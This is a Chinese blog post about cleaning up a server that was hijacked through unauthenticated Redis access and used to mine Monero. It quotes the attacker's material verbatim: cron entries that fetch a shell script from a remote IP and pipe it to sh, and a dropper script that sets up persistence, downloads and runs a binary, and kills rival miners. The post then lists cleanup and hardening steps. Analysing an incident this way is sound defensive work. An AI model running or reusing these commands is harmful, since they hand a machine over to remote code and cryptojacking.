<!DOCTYPE html>

<html>

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <title>
    服务器被植入挖矿程序 - 夕枫主&#39;s blog
    
  </title>

  <meta name="description" content="服务器被植入挖矿程序">

  <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
  <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

  <script src="https://use.fontawesome.com/releases/v5.15.3/js/all.js" crossorigin="anonymous"></script>

  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="xifengzhu.github.com/2017/11/07/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%A4%8D%E5%85%A5%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F.html">
  <link rel="alternate" type="application/rss+xml" title="夕枫主&#39;s blog" href="/feed.xml">

</head>


<body>

  <!-- Navigation -->
<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
    <div class="container">
      <a class="navbar-brand" href="/">夕枫主&#39;s blog</a>
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
        Menu
        <i class="fa fa-bars"></i>
      </button>
      <div class="collapse navbar-collapse" id="navbarResponsive">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/posts">Posts</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="/about">About</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>

  <!-- Page Header -->

<header class="masthead" style="background-image: url('/assets/images/bg-post.jpg')">
  
    <div class="overlay"></div>
    <div class="container">
      <div class="row">
        <div class="col-lg-8 col-md-10 mx-auto">
          <div class="post-heading">
            <h1>服务器被植入挖矿程序</h1>
            
            <span class="meta">
              November 07, 2017 &middot; <span class="reading-time" title="Estimated read time">
  
   9 mins  read </span>

            </span>
          </div>
        </div>
      </div>
    </div>
  </header>

  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-md-10 mx-auto">

        <p>服务器被植入挖矿程序</p>

<h2 id="事件简介">事件简介</h2>
<p>服务器遭遇入侵，入侵者通过 Redis 未授权访问缺陷，植入挖矿程序</p>

<h2 id="起因">起因</h2>
<p>Redis 未授权访问缺陷可轻易导致系统被黑</p>

<h2 id="经过">经过</h2>

<p>执行 <code class="language-plaintext highlighter-rouge">htop</code> 发现异常进程</p>

<p><img src="https://user-images.githubusercontent.com/4188624/32473483-512966e0-c32d-11e7-842e-f76b7b0558c8.png" alt="1__deployer_VM-117-230-ubuntu___var_lib_postgresql_9_3_main__ssh_.png" /></p>

<p>查看异常进程信息 <code class="language-plaintext highlighter-rouge">sudo ls -al /proc/25461</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dr-xr-xr-x   9 deployer postgres 0 Nov  6 13:15 .
dr-xr-xr-x 193 root     root     0 Aug 19 12:05 ..
dr-xr-xr-x   2 deployer postgres 0 Nov  6 13:15 attr
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 autogroup
-r--------   1 deployer postgres 0 Nov  6 13:15 auxv
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 cgroup
--w-------   1 deployer postgres 0 Nov  6 13:15 clear_refs
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 cmdline
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 comm
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 coredump_filter
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 cpuset
lrwxrwxrwx   1 deployer postgres 0 Nov  6 13:15 cwd -&gt; /
-r--------   1 deployer postgres 0 Nov  6 13:15 environ
lrwxrwxrwx   1 deployer postgres 0 Nov  6 13:15 exe -&gt; /var/lib/postgresql/9.3/main/x3776026004
dr-x------   2 deployer postgres 0 Nov  6 13:15 fd
dr-x------   2 deployer postgres 0 Nov  6 13:15 fdinfo
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 gid_map
-r--------   1 deployer postgres 0 Nov  6 13:15 io
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 latency
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 limits
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 loginuid
dr-x------   2 deployer postgres 0 Nov  6 13:15 map_files
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 maps
-rw-------   1 deployer postgres 0 Nov  6 13:15 mem
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 mountinfo
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 mounts
-r--------   1 deployer postgres 0 Nov  6 13:15 mountstats
dr-xr-xr-x   5 deployer postgres 0 Nov  6 13:15 net
dr-x--x--x   2 deployer postgres 0 Nov  6 13:15 ns
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 numa_maps
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 oom_adj
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 oom_score
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 oom_score_adj
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 pagemap
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 personality
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 projid_map
lrwxrwxrwx   1 deployer postgres 0 Nov  6 13:15 root -&gt; /
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 sched
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 schedstat
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 sessionid
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 smaps
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 stack
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 stat
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 statm
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 status
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 syscall
dr-xr-xr-x  13 deployer postgres 0 Nov  6 13:15 task
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 timers
-rw-r--r--   1 deployer postgres 0 Nov  6 13:15 uid_map
-r--r--r--   1 deployer postgres 0 Nov  6 13:15 wchan
</code></pre></div></div>

<p>发现异常进程<code class="language-plaintext highlighter-rouge">exe -&gt; /var/lib/postgresql/9.3/main/x3776026004</code> 查看 pg 目录 <code class="language-plaintext highlighter-rouge">/var/lib/postgresql/9.3/main</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>drwx------ 15 deployer postgres    4096 Oct 23 04:33 ./
drwxr-xr-x  3 deployer postgres    4096 Aug 16  2016 ../
drwx------  6 deployer postgres    4096 Aug 30 17:53 base/
drwx------  2 deployer postgres    4096 Sep  5 16:08 global/
drwx------  2 deployer postgres    4096 Aug 16  2016 pg_clog/
drwx------  4 deployer postgres    4096 Aug 16  2016 pg_multixact/
drwx------  2 deployer postgres    4096 Aug 30 18:13 pg_notify/
drwx------  2 deployer postgres    4096 Aug 16  2016 pg_serial/
drwx------  2 deployer postgres    4096 Aug 16  2016 pg_snapshots/
drwx------  2 deployer postgres    4096 Aug 30 18:13 pg_stat/
drwx------  2 deployer postgres    4096 Nov  6 12:19 pg_stat_tmp/
drwx------  2 deployer postgres    4096 Aug 16  2016 pg_subtrans/
drwx------  2 deployer postgres    4096 Aug 16  2016 pg_tblspc/
drwx------  2 deployer postgres    4096 Aug 16  2016 pg_twophase/
<span class="nt">-rw-------</span>  1 deployer postgres       4 Aug 16  2016 PG_VERSION
drwx------  3 deployer postgres    4096 Aug 16  2016 pg_xlog/
<span class="nt">-rw-------</span>  1 deployer postgres     133 Aug 30 18:13 postmaster.opts
<span class="nt">-rw-------</span>  1 deployer postgres      93 Aug 30 18:13 postmaster.pid
<span class="nt">-rwxrwxrwx</span>  1 deployer postgres   14480 Oct 13 10:06 ps3767604655<span class="k">*</span>
<span class="nt">-rw-r--r--</span>  1 deployer postgres   15360 Oct 12 03:58 vcredist_x64_1130.dll
<span class="nt">-rw-r--r--</span>  1 deployer postgres  100352 Oct 13 04:52 vcredist_x64_2191.dll
<span class="nt">-rw-r--r--</span>  1 deployer postgres   15360 Oct 12 08:50 vcredist_x64_5569.dll
<span class="nt">-rw-r--r--</span>  1 deployer postgres  100352 Oct 23 04:33 vcredist_x64_6375.dll
<span class="nt">-rw-r--r--</span>  1 deployer postgres  100352 Oct 16 05:12 vcredist_x64_8544.dll
<span class="nt">-rw-r--r--</span>  1 deployer postgres   11264 Oct 12 03:58 vcredist_x86_1071.dll
<span class="nt">-rw-r--r--</span>  1 deployer postgres   11264 Oct 12 08:50 vcredist_x86_5380.dll
<span class="nt">-rw-r--r--</span>  1 deployer postgres   81408 Oct 23 04:33 vcredist_x86_7537.dll
<span class="nt">-rw-r--r--</span>  1 deployer postgres   81408 Oct 13 04:52 vcredist_x86_9105.dll
<span class="nt">-rw-r--r--</span>  1 deployer postgres   81408 Oct 16 05:12 vcredist_x86_928.dll
<span class="nt">-rwxrwxrwx</span>  1 deployer postgres  496464 Oct 13 10:06 x3776026004<span class="k">*</span>
<span class="nt">-rw-------</span>  1 deployer postgres 4676439 Nov  6 12:19 xmr.txt
</code></pre></div></div>

<p><strong>恶意程序（<code class="language-plaintext highlighter-rouge">x3776026004</code>）植入时间为 2017年10月13号10：06分</strong></p>

<p>查看 <code class="language-plaintext highlighter-rouge">xmr.txt</code> 文件</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> VERSIONS:     XMRig/2.3.1-dev libuv/1.9.1 gcc/6.3.0
<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> HUGE PAGES:   available, disabled
<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> CPU:          Intel<span class="o">(</span>R<span class="o">)</span> Xeon<span class="o">(</span>R<span class="o">)</span> CPU E5-26xx v3 <span class="o">(</span>1<span class="o">)</span> x64 AES-NI
<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> CPU L2/L3:    24.0 MB/0.0 MB
<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> THREADS:      6, cryptonight, <span class="nv">av</span><span class="o">=</span>1, <span class="nv">donate</span><span class="o">=</span>0%
<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> POOL <span class="c">#1:      xmr.crypto-pool.fr:80</span>
<span class="o">[</span>2017-10-13 10:06:31]  <span class="k">*</span> COMMANDS:     <span class="s1">'h'</span> hashrate, <span class="s1">'p'</span> pause, <span class="s1">'r'</span> resume
<span class="o">[</span>2017-10-13 10:06:31] use pool xmr.crypto-pool.fr:80 163.172.226.114
<span class="o">[</span>2017-10-13 10:06:31] new job from xmr.crypto-pool.fr:80 diff 50000
<span class="o">[</span>2017-10-13 10:06:37] new job from xmr.crypto-pool.fr:80 diff 50000
<span class="o">[</span>2017-10-13 10:06:47] new job from xmr.crypto-pool.fr:80 diff 50000
</code></pre></div></div>

<p>访问地址 <code class="language-plaintext highlighter-rouge">xmr.crypto-pool.fr</code></p>

<p><img src="https://user-images.githubusercontent.com/4188624/32473858-42dc9ed4-c32f-11e7-9e9c-822021dc38f4.png" alt="xmr_crypto-pool_fr" /></p>

<p><strong>这个恶意程序为一个是挖矿程序</strong></p>

<p>检查 <code class="language-plaintext highlighter-rouge">/var/spool/cron/crontabs/</code>
发现有定时任务执行</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>/1 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> curl <span class="nt">-L</span> http://218.248.40.228:8443/i.sh | sh
<span class="k">*</span>/1 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> wget <span class="nt">-q</span> http://218.248.40.228:8443/i.sh <span class="nt">-O</span> - | sh
</code></pre></div></div>

<p>恶意代码如下</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/bin:/usr/bin:/usr/local/bin:/usr/sbin
<span class="nb">echo</span> <span class="s2">"*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh"</span> <span class="o">&gt;</span> /var/spool/cron/root
<span class="nb">echo</span> <span class="s2">"*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh"</span> <span class="o">&gt;&gt;</span> /var/spool/cron/root
<span class="nb">mkdir</span> <span class="nt">-p</span> /var/spool/cron/crontabs
<span class="nb">echo</span> <span class="s2">"*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh"</span> <span class="o">&gt;</span> /var/spool/cron/crontabs/root
<span class="nb">echo</span> <span class="s2">"*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh"</span> <span class="o">&gt;&gt;</span> /var/spool/cron/crontabs/root
<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"/tmp/ddg.2020"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span>curl <span class="nt">-fsSL</span> http://218.248.40.228:8443/2020/ddg.<span class="si">$(</span><span class="nb">uname</span> <span class="nt">-m</span><span class="si">)</span> <span class="nt">-o</span> /tmp/ddg.2020
<span class="k">fi
if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"/tmp/ddg.2020"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span>wget <span class="nt">-q</span> http://218.248.40.228:8443/2020/ddg.<span class="si">$(</span><span class="nb">uname</span> <span class="nt">-m</span><span class="si">)</span> <span class="nt">-O</span> /tmp/ddg.2020
<span class="k">fi
</span><span class="nb">chmod</span> +x /tmp/ddg.2020 <span class="o">&amp;&amp;</span> /tmp/ddg.2020
ps auxf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep </span>Circle_MI | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | xargs <span class="nb">kill
</span>ps auxf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep </span>get.bi-chi.com | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | xargs <span class="nb">kill
</span>ps auxf | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nb">grep</span> | <span class="nb">grep</span> /boot/efi/ | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | xargs <span class="nb">kill</span>
<span class="c">#ps auxf | grep -v grep | grep ddg.2006 | awk '{print $2}' | kill</span>
<span class="c">#ps auxf | grep -v grep | grep ddg.2010 | awk '{print $2}' | kill</span>
</code></pre></div></div>

<h2 id="解决方法">解决方法</h2>
<ol>
  <li>关闭访问挖矿服务器的访问 <code class="language-plaintext highlighter-rouge">iptables -A INPUT -s xmr.crypto-pool.fr -j DROP</code> and <code class="language-plaintext highlighter-rouge">iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</code></li>
  <li>检查 <code class="language-plaintext highlighter-rouge">crontab</code> 中的定时任务，删除恶意定时任务</li>
  <li>杀掉挖矿程序，并清除恶意程序</li>
  <li>配置 <code class="language-plaintext highlighter-rouge">bind</code> 选项, 限定可以连接 <code class="language-plaintext highlighter-rouge">Redis</code> 服务器的 <code class="language-plaintext highlighter-rouge">IP</code>, 并修改 <code class="language-plaintext highlighter-rouge">redis</code> 的默认端口6379, 配置rename-command 配置项</li>
  <li>查找 <code class="language-plaintext highlighter-rouge">/tmp</code> 目录是否有发现可以文件，找到并且清除</li>
  <li>打开 <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code>, 删除你不认识的账号</li>
  <li>所有操作完成之后，记得再次使用 <code class="language-plaintext highlighter-rouge">htop</code> 观察一段时间，确保挖矿守护进程已经干掉，挖矿程序没有重新启动服务</li>
</ol>

<h2 id="参考链接">参考链接</h2>

<ul>
  <li>http://www.chinaz.com/server/2015/1112/469670.shtml</li>
  <li>http://53cto.blog.51cto.com/9899631/1826989</li>
</ul>


        <hr>

        <div class="clearfix">

          
          <a class="btn btn-primary float-left" href="/2017/08/26/unicorn-auto-start-after-server-boot.html" data-toggle="tooltip" data-placement="top" title="Unicorn auto start after server boot">&larr; Previous<span class="d-none d-md-inline">
              Post</span></a>
          
          
          <a class="btn btn-primary float-right" href="/2017/11/17/%E4%BD%BF%E7%94%A8monit-%E7%9B%91%E5%90%AC-unicorn-%E8%BF%9B%E7%A8%8B.html" data-toggle="tooltip" data-placement="top" title="使用Monit 监听 Unicorn 进程">Next<span class="d-none d-md-inline">
              Post</span> &rarr;</a>
          

        </div>

      </div>
    </div>
  </div>

<style>
    img {
        max-width: -webkit-fill-available;
    }
</style>

  <!-- Footer -->

<hr>

<footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-md-10 mx-auto">
        <ul class="list-inline text-center">
          
          <li class="list-inline-item">
            <a href="mailto:xifengzhu520@gmail.com">
              <span class="fa-stack fa-lg">
                <i class="fas fa-circle fa-stack-2x"></i>
                <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
          
          <li class="list-inline-item">
            <a href="https://twitter.com/xifengzhu">
              <span class="fa-stack fa-lg">
                <i class="fas fa-circle fa-stack-2x"></i>
                <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
          
          
          
          <li class="list-inline-item">
            <a href="https://github.com/xifengzhu">
              <span class="fa-stack fa-lg">
                <i class="fas fa-circle fa-stack-2x"></i>
                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
              </span>
            </a>
          </li>
          
          
        </ul>
        <p class="copyright text-muted">Copyright &copy; xifengzhu 2024</p>
      </div>
    </div>
  </div>
</footer>


  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="/assets/vendor/startbootstrap-clean-blog/js/scripts.js"></script>

<script src="/assets/scripts.js"></script>




  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', '');
</script>



</body>

</html>